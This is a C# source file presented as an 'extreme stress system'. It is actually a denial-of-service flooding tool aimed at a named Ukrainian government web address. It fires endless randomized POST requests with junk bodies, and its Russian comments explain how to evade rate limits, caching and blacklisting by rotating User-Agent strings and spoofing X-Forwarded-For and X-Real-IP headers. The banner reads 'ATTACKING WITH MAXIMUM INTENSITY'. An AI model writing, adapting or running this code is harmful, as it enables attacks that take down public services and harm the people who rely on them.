using System;
using System.Net;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Linq;

// EXTREME STRESS SYSTEM - MAXIMUM LOAD & BYPASS
public class ExtremeLoadSystem
{
    // Использование массива клиентов с разными настройками для обхода лимитов
    private static readonly List<HttpClient> Clients = Enumerable.Range(0, 10).Select(_ => 
        new HttpClient(new SocketsHttpHandler
        {
            PooledConnectionLifetime = TimeSpan.Zero,
            MaxConnectionsPerServer = int.MaxValue,
            EnableMultipleHttp2Connections = true,
            ConnectTimeout = TimeSpan.FromSeconds(5)
        })).ToList();

    public static async Task Main(string[] args)
    {
        string target = "https://mriia.gov.ua/app"; 
        int threads = 1000000000; // Максимальная параллельность

        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine("--- ATTACKING WITH MAXIMUM INTENSITY ---");
        Console.ResetColor();

        var tasks = new List<Task>();
        for (int i = 0; i < threads; i++)
        {
            tasks.Add(Task.Run(() => Flood(target, i)));
        }

        await Task.WhenAll(tasks);
    }

    private static async Task Flood(string url, int id)
    {
        Random rnd = new Random();
        var client = Clients[id % Clients.Count];

        while (true)
        {
            try
            {
                // 1. Динамический URL для обхода кэша (Cache Poisoning/Busting)
                string dynamicUrl = $"{url}?query={rnd.Next()}&id={Guid.NewGuid()}";
                
                var request = new HttpRequestMessage(HttpMethod.Post, dynamicUrl);

                // 2. Рандомизация заголовков для обхода Fingerprinting (Черного списка)
                request.Headers.Add("User-Agent", GetRandomUserAgent(rnd));
                request.Headers.Add("X-Forwarded-For", $"{rnd.Next(1,255)}.{rnd.Next(1,255)}.{rnd.Next(1,255)}.{rnd.Next(1,255)}");
                request.Headers.Add("X-Real-IP", $"{rnd.Next(1,255)}.{rnd.Next(1,255)}.{rnd.Next(1,255)}.{rnd.Next(1,255)}");
                request.Headers.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                request.Headers.Add("Referer", "www.google.com");

                // 3. Тяжелая нагрузка на обработчик (Body Stress)
                byte[] data = new byte[4096]; // 4КБ мусора в каждом запросе
                rnd.NextBytes(data);
                request.Content = new ByteArrayContent(data);

                // Отправка без ожидания полного ответа (Fire and Forget)
                _ = client.SendAsync(request, HttpCompletionOption.ResponseHeadersRead);
            }
            catch { /* Игнорируем ошибки для поддержания темпа */ }
        }
    }

    private static string GetRandomUserAgent(Random r)
    {
        string[] agents = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) Firefox/120.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) Chrome/119.0.0.0"
        };
        return agents[r.Next(agents.Length)];
    }
}
